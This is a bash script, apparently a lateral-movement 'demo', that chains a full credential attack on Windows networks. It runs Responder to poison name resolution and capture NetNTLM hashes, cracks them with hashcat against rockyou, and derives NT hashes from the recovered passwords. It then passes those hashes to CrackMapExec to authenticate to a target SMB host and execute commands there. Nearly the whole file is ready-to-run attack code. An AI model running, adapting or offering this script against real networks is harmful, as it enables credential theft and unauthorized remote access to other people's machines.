#!/usr/bin/env bash
set -euo pipefail

# === Colors for output ===
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# === Argument and Privilege Checks ===
if [[ $# -lt 2 || $# -gt 3 ]]; then
    echo -e "${RED}Usage: sudo $0 <interface> <target_smb_ip> [<wordlist_path>]${NC}"
    echo -e "${RED}Example: sudo $0 eth0 192.168.1.105 /usr/share/wordlists/rockyou.txt${NC}"
    exit 1
fi

if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root. Please use 'sudo'.${NC}"
   exit 1
fi

# Check for required tools
for tool in responder crackmapexec sqlite3 ip hashcat pkill; do
    if ! command -v "$tool" &> /dev/null; then
        echo -e "${RED}Error: Required tool '$tool' is not installed or not in PATH.${NC}"
        exit 1
    fi
done

responder_iface="$1"
target_ip="$2"
wordlist="${3:-/usr/share/wordlists/rockyou.txt}"

if [[ ! -f "$wordlist" ]]; then
    echo -e "${RED}Error: Wordlist '$wordlist' not found. Provide a valid path.${NC}"
    exit 1
fi

# Validate interface exists and is up
if ! ip link show "$responder_iface" &> /dev/null; then
    echo -e "${RED}Error: Interface '$responder_iface' does not exist. Run 'ip link' to list interfaces.${NC}"
    exit 1
fi
if ! ip link show "$responder_iface" | grep -q "state UP"; then
    echo -e "${YELLOW}[!] Warning: Interface '$responder_iface' is not UP. Attempting to bring it up...${NC}"
    ip link set "$responder_iface" up || echo -e "${RED}[!] Failed to bring up interface.${NC}"
fi

# === Setup ===
demo_dir="$PWD/demo_output"
log_file="$demo_dir/lateral_log.txt"
captured_file="$demo_dir/captured_hashes.txt"
cracked_file="$demo_dir/cracked_hashes.txt"
responder_log_dir="$demo_dir/responder_logs"
responder_db="$responder_log_dir/Responder.db"
responder_session_log="$responder_log_dir/Responder-Session.log"
responder_stdout_log="$responder_log_dir/responder_stdout.log"
hashcat_potfile="$demo_dir/hashcat.potfile"

echo -e "${YELLOW}[*] Setting up demo environment in: $demo_dir${NC}"
mkdir -p "$demo_dir" "$responder_log_dir"
chown -R $USER:$USER "$demo_dir"  # Ensure permissions
> "$log_file"
> "$captured_file"
> "$cracked_file"

# === Enhanced Process Termination ===
echo -e "${YELLOW}[*] Terminating any existing Responder processes...${NC}"
if pgrep -f "responder" > /dev/null; then
    echo -e "${YELLOW}[!] Found active Responder process(es). Terminating...${NC}"
    pkill -f "responder"
    sleep 2  # Allow processes to exit 
    
    # Verify termination
    if pgrep -f "responder" > /dev/null; then
        echo -e "${RED}[!] Force-killing stubborn processes with SIGKILL...${NC}"
        pkill -9 -f "responder"
        sleep 1
        if pgrep -f "responder" > /dev/null; then
            echo -e "${RED}[!] CRITICAL: Failed to terminate all Responder processes.${NC}"
            echo -e "${RED}    Please manually kill with: sudo pkill -9 -f 'responder'${NC}"
            exit 1
        else
            echo -e "${GREEN}[+] All Responder processes terminated.${NC}"
        fi
    else
        echo -e "${GREEN}[+] Responder processes terminated successfully.${NC}"
    fi
else
    echo -e "${GREEN}[+] No active Responder processes found.${NC}"
fi

# === Clear Responder Cache ===
echo -e "${YELLOW}[*] Clearing Responder cache/database/logs...${NC}"
rm -f "$responder_db" "$responder_session_log" "$responder_stdout_log" "$hashcat_potfile"
if [[ ! -f "$responder_db" && ! -f "$responder_session_log" && ! -f "$responder_stdout_log" && ! -f "$hashcat_potfile" ]]; then
    echo -e "${GREEN}[+] Cache cleared successfully.${NC}"
else
    echo -e "${RED}[!] Failed to clear cache. Check permissions.${NC}"
    exit 1
fi

# === Launch Responder ===
echo -e "${YELLOW}[*] Preparing Responder in $responder_log_dir...${NC}"

# Copy the Responder installation to a subdir in our log dir for isolated execution
responder_copy_dir="$responder_log_dir/responder_copy"
rm -rf "$responder_copy_dir"  # Clean up any previous copy
cp -r /usr/share/responder "$responder_copy_dir" || { echo -e "${RED}[!] Failed to copy /usr/share/responder to $responder_copy_dir${NC}"; exit 1; }
chmod -R u+rw "$responder_copy_dir"  # Ensure writable (for DB/logs creation)

# Adjust paths to match where files will now be created
responder_db="$responder_copy_dir/Responder.db"
responder_session_log="$responder_copy_dir/logs/Responder-Session.log"  # Responder creates a 'logs/' subdir automatically
responder_stdout_log="$responder_log_dir/responder_stdout.log"  # Keep as before

# Clear any existing files in the copy (expands on your existing clear step)
echo -e "${YELLOW}[*] Clearing Responder cache/database/logs in copy...${NC}"
rm -rf "$responder_copy_dir/logs" "$responder_db" "$responder_stdout_log" "$hashcat_potfile"
mkdir -p "$responder_copy_dir/logs"  # Pre-create logs dir if needed
if [[ ! -f "$responder_db" && ! -f "$responder_session_log" && ! -f "$responder_stdout_log" && ! -f "$hashcat_potfile" ]]; then
    echo -e "${GREEN}[+] Cache cleared successfully.${NC}"
else
    echo -e "${RED}[!] Failed to clear cache. Check permissions.${NC}"
    exit 1
fi

# Launch directly with python3 (bypassing the wrapper's cd)
echo -e "${YELLOW}[*] Launching Responder on interface $responder_iface from dir $responder_copy_dir...${NC}"
cd "$responder_copy_dir" || { echo -e "${RED}[!] Failed to change to $responder_copy_dir${NC}"; exit 1; }
echo "[DEBUG] Current working dir: $(pwd)"  # Verify
python3 Responder.py -I "$responder_iface" -wFd -v > "$responder_stdout_log" 2>&1 &
responder_pid=$!
sleep 5

if ! ps -p "$responder_pid" > /dev/null 2>&1; then
    echo -e "${RED}[!] Responder failed to start (PID $responder_pid died immediately).${NC}"
    echo -e "${YELLOW}[*] Command attempted: python3 Responder.py -I $responder_iface -wFd -v${NC}"
    echo -e "${YELLOW}[*] Stdout log contents:${NC}"
    cat "$responder_stdout_log" || echo "(Empty)"
    if [[ -f "$responder_session_log" ]]; then
        echo -e "${YELLOW}[*] Session log contents:${NC}"
        cat "$responder_session_log"
    fi
    exit 1
fi

echo -e "${GREEN}[+] Responder launched with PID: $responder_pid${NC}"
# Extra check for DB early on
sleep 5  # Give it a moment to potentially create DB
if [[ -f "$responder_db" ]]; then
    echo "[DEBUG] Responder.db created successfully in expected location."
else
    echo "[DEBUG] Responder.db not created yet (will check during wait loop)."
fi

# === Wait for hashes ===
echo -e "${YELLOW}[*] Waiting for hashes to be captured... (Timeout: 300 seconds)${NC}"
echo -e "${YELLOW}[!] On a Windows victim machine, try browsing to: \\\\$(ip -4 addr show "$responder_iface" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')\\share${NC}"

wait_time=0
timeout=300
hash_count=0
while [[ $hash_count -eq 0 && $wait_time -lt $timeout ]]; do
    if [[ -f "$responder_db" ]]; then
        hash_count=$(sqlite3 "$responder_db" "SELECT COUNT(*) FROM responder WHERE fullhash IS NOT NULL;" 2>/dev/null || echo "0")
        echo "[DEBUG] DB exists. Row count (fullhash not null): $hash_count"
    else
        echo "[DEBUG] Responder.db not yet created."
    fi
    if [[ $hash_count -eq 0 ]]; then
        if [[ $((wait_time % 15)) -eq 0 && -f "$responder_session_log" ]]; then
            echo -e "${YELLOW}[*] Session log snippet: $(tail -1 "$responder_session_log")${NC}"
        fi
        printf "."
        sleep 5
        wait_time=$((wait_time + 5))
    fi
done
echo

if [[ $hash_count -eq 0 ]]; then
    echo -e "\n${RED}[!] Timed out. No hashes were captured in DB.${NC}" | tee -a "$log_file"
    echo -e "${YELLOW}[*] Troubleshooting info:${NC}"
    echo "  - Stdout log: $(wc -l < "$responder_stdout_log") lines"
    echo "  - Session log: $([[ -f "$responder_session_log" ]] && wc -l < "$responder_session_log" || echo "Does not exist") lines"
    echo "  - DB exists? $([[ -f "$responder_db" ]] && echo "Yes ($hash_count rows)" || echo "No")"
    echo -e "${YELLOW}[*] Stopping Responder...${NC}"
    kill "$responder_pid" 2>/dev/null || echo "[!] Responder already stopped."
    exit 1
fi

echo -e "${GREEN}[+] Success! Captured $hash_count hash(es) in DB.${NC}"

# === Extract Hashes from Responder.db (Raw Format for Hashcat) ===
echo -e "${YELLOW}[*] Extracting raw NetNTLM hashes from Responder.db...${NC}"
> "$captured_file"  # Clear the file first

# Debug: Log the count and types for troubleshooting
hash_count=$(sqlite3 "$responder_db" "SELECT COUNT(*) FROM responder WHERE fullhash IS NOT NULL;" 2>/dev/null || echo "0")
echo "[DEBUG] Total non-null fullhash rows: $hash_count"
sqlite3 "$responder_db" "SELECT type FROM responder WHERE fullhash IS NOT NULL;" > "$demo_dir/hash_types.txt"
echo "[DEBUG] Captured hash types written to: $demo_dir/hash_types.txt"

sqlite3 "$responder_db" <<EOF >> "$captured_file"
.headers off
.mode list
.separator "\n"
-- Extract all NTLM-like fullhashes (includes NTLMv2, NTLMv2-SSP, etc.)
SELECT UPPER(fullhash) FROM responder WHERE fullhash IS NOT NULL AND type LIKE 'NTLM%';
EOF

extracted_count=$(wc -l < "$captured_file" 2>/dev/null || echo "0")
if [[ $extracted_count -eq 0 ]]; then
    echo -e "${YELLOW}[!] No valid NTLM hashes extracted from DB (check types in $demo_dir/hash_types.txt). Falling back to log parsing...${NC}"
    # Fallback: Parse raw hashes from responder_stdout.log (broadened for NTLMv1/v2/SSP)
    grep -oP '\[SMB\] NTLM(v[12]|v[12]-SSP) Hash\s+:\s+\K[^$]+' "$responder_stdout_log" | tr -d ' ' | tr '[:lower:]' '[:upper:]' >> "$captured_file"
    fallback_count=$(wc -l < "$captured_file" 2>/dev/null || echo "0")
    if [[ $fallback_count -eq 0 ]]; then
        echo -e "${RED}[!] No hashes found in logs either. Check log format or if NTLM was captured.${NC}"
        exit 1
    else
        echo -e "${GREEN}[+] Extracted $fallback_count raw hashes from logs as fallback.${NC}"
    fi
else
    echo -e "${GREEN}[+] Extracted $extracted_count raw hashes from DB.${NC}"
fi

# === Crack Hashes with Hashcat ===
echo -e "${YELLOW}[*] Cracking captured NetNTLMv2 hashes using Hashcat (wordlist: $wordlist)...${NC}"
hashcat -m 5600 -a 0 "$captured_file" "$wordlist" --potfile-path "$hashcat_potfile" --quiet --force -D 1 -d 1 -O -w 1 | tee -a "$log_file"

# Check for required tools to compute NT hash
for tool in iconv openssl; do
    if ! command -v "$tool" &> /dev/null; then
        echo -e "${RED}Error: Required tool '$tool' is not installed for NT hash computation.${NC}"
        exit 1
    fi
done

> "$cracked_file"
cracked_count=0
echo "[DEBUG] Starting potfile parsing..." | tee -a "$log_file"
if [[ -s "$hashcat_potfile" ]]; then
    set +e  # Temporarily disable early exit to avoid pipefail issues
    while read -r line; do
        echo "[DEBUG] Processing potfile line: $line" | tee -a "$log_file"
        if [[ "$line" =~ ^([^:]+)::([^:]+):([a-fA-F0-9]{16}):([a-fA-F0-9]{32}):([^:]+):(.+)$ ]]; then
            username="${BASH_REMATCH[1]}"
            plaintext="${BASH_REMATCH[6]}"  # Extract the cracked plaintext password
            echo "[DEBUG] Matched - Username: $username, Plaintext: $plaintext" | tee -a "$log_file"
            # Compute NT hash: MD4(UTF-16LE(plaintext)) - wrap in subshell to avoid pipefail/exit
            nt_hash=$( (echo -n "$plaintext" | iconv -t utf16le | openssl md4 | awk '{print $2}') || echo "" )
            echo "[DEBUG] NT hash computation attempted." | tee -a "$log_file"
            if [[ -n "$nt_hash" ]]; then
                echo "$username:$nt_hash" >> "$cracked_file"
                echo "[DEBUG] Wrote to cracked_file: $username:$nt_hash" | tee -a "$log_file"
                ((cracked_count++))
                echo "[DEBUG] Incremented cracked_count to $cracked_count" | tee -a "$log_file"
            else
                echo -e "${YELLOW}[!] Failed to compute NT hash for $username (plaintext: $plaintext). Skipping.${NC}" | tee -a "$log_file"
            fi
        else
            echo "[DEBUG] Line did not match regex: $line" | tee -a "$log_file"
        fi
    done < "$hashcat_potfile"
    echo "[DEBUG] Loop completed. Total lines processed." | tee -a "$log_file"
    set -e  # Re-enable early exit
else
    echo "[DEBUG] Potfile is empty or does not exist. No parsing done." | tee -a "$log_file"
fi
echo "[DEBUG] Parsing complete. Cracked count: $cracked_count" | tee -a "$log_file"

if [[ $cracked_count -eq 0 ]]; then
    echo -e "${RED}[!] No hashes cracked. Verify the wordlist contains the exact password, or try a larger one like rockyou.txt.${NC}" | tee -a "$log_file"
else
    echo -e "${GREEN}[+] Cracked $cracked_count hash(es) and computed NT hashes.${NC}" | tee -a "$log_file"
fi

# === SMB Access Check with CrackMapExec ===
echo -e "${YELLOW}[*] Attempting SMB access to $target_ip using cracked NT hashes...${NC}"
success_count=0
fail_count=0
crack_fail_count=0

while IFS=: read -r username nt_hash; do
    [[ -z "$username" || -z "$nt_hash" ]] && continue

    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    echo "$ts: [*] Testing $username@$target_ip" | tee -a "$log_file"

    if [[ -z "$nt_hash" ]]; then
        echo -e "$ts: ${YELLOW}[SKIP] No cracked NT hash for $username${NC}" | tee -a "$log_file"
        ((crack_fail_count++))
        continue
    fi

    # Attempt PassTheHash and capture output
    cme_output=$(crackmapexec smb "$target_ip" -u "$username" -H "$nt_hash" --continue-on-success 2>&1)
    echo "$cme_output" | tee -a "$log_file"

    # Check for successful authentication (broadened for demo)
    set +e  # Temporarily disable early exit
    if echo "$cme_output" | grep -q "SMB" && ! echo "$cme_output" | grep -q "FAIL\|ACCESS_DENIED"; then
        echo "[DEBUG] Auth success detected (SMB connection established)." | tee -a "$log_file"
        echo -e "$ts: ${GREEN}[OK]   Access successful for $username@$target_ip (Pass The Hash demo complete)${NC}" | tee -a "$log_file"
        ((success_count++))
        echo "[DEBUG] Success count incremented to $success_count." | tee -a "$log_file"
        echo "[DEBUG] Entering command execution block." | tee -a "$log_file"

        # Execute a command on success (can be customized) - wrap in subshell
        success_command="whoami /all"  # Example: Run 'whoami /all' via cmd.exe
        echo "$ts: [*] Executing command on target: $success_command" | tee -a "$log_file"
        cmd_output=$( (crackmapexec smb "$target_ip" -u "$username" -H "$nt_hash" -X "$success_command" 2>&1) || echo "[ERROR] CME command failed internally." )
        echo "[DEBUG] Command execution attempted." | tee -a "$log_file"
        echo "$cmd_output" | tee -a "$log_file"
        if [[ $? -eq 0 && -n "$cmd_output" ]]; then
            echo "$ts: [CMD SUCCESS] Command output logged above." | tee -a "$log_file"
        else
            echo "$ts: [CMD FAIL] Command execution failed (check output above or permissions)." | tee -a "$log_file"
        fi
        echo "[DEBUG] Exited command execution block." | tee -a "$log_file"
    else
        echo "[DEBUG] Auth failed (no SMB success or access denied)." | tee -a "$log_file"
        echo -e "$ts: ${RED}[FAIL] Access denied for $username@$target_ip${NC}" | tee -a "$log_file"
        ((fail_count++))
    fi
    set -e  # Re-enable early exit
done < "$cracked_file"

# === Summary ===
echo
echo "=== Summary ===" | tee -a "$log_file"
echo "Target IP: $target_ip" | tee -a "$log_file"
echo "Captured Hashes: $hash_count" | tee -a "$log_file"
echo "Cracked Hashes: $cracked_count" | tee -a "$log_file"
echo -e "Successes: ${GREEN}$success_count${NC}" | tee -a "$log_file"
echo -e "Failures:  ${RED}$fail_count${NC}" | tee -a "$log_file"
echo -e "Crack Failures:  ${YELLOW}$crack_fail_count${NC}" | tee -a "$log_file"
echo "-------------------"
echo "Full logs written to: $log_file"
echo "Captured hashes stored in: $captured_file"
echo "Cracked hashes stored in: $cracked_file"
echo "Responder logs are in: $responder_log_dir"
echo "Demo output directory: $demo_dir"
